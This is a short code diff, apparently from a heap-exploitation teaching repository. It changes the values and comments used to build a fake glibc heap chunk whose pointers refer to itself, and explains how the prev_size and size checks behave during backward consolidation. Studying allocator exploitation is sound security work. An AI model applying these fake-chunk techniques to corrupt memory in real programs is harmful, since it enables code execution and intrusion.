@@ -38,8 +38,8 @@ int main()
 
 	size_t fake_chunk[6];
 
-	fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk's size to pass P->bk->size == P->prev_size
-	fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin
+	fake_chunk[0] = 0x00; // The prev_size vs. size check is of no concern, until GLIBC 2.26 P->bk->size == P->prev_size check
+	fake_chunk[1] = 0x00; // Arbitrary value; fake_chunk->size is ignored during backward consolidation.
 	fake_chunk[2] = (size_t) fake_chunk; // fwd
 	fake_chunk[3] = (size_t) fake_chunk; // bck
 	fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize
